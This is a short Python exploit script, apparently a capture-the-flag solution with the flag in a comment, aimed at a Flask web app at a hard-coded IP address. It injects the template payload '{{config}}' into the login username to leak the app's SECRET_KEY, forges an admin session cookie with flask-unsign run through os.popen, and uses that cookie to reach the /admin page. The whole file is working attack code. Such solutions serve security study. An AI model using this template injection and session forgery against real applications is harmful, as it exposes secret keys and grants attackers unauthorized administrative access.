import requests 
import os

# https://www.bordergate.co.uk/flask-session-cookies/
# hspace{Th3_s3cret_key_Mu5t_nOT_Be_le4KeD!!!}

url = "http://3.36.132.18:4000"

s = requests.session() 
r = requests.post(
        f"{url}/login", 
        data={
            "username": "{{config}}",
            "password": "test"
            }
)
        
secret_key = r.text[r.text.find("SECRET_KEY") + 22: r.text.find("SECRET_KEY") + 82]

header = {"admin": True}
cmd = "flask-unsign --sign --cookie \"" + "{'admin': 'true'}" + f"\" --secret '{secret_key}'"
print(cmd)
jwt_encode = os.popen(cmd).read().split("\n")[0]
        
print("jwt:", jwt_encode)

r = requests.get(
    f"{url}/admin",
    cookies={"session":jwt_encode}
)

if "Hello" in r.text:
    print(r.text)
    exit()
        

 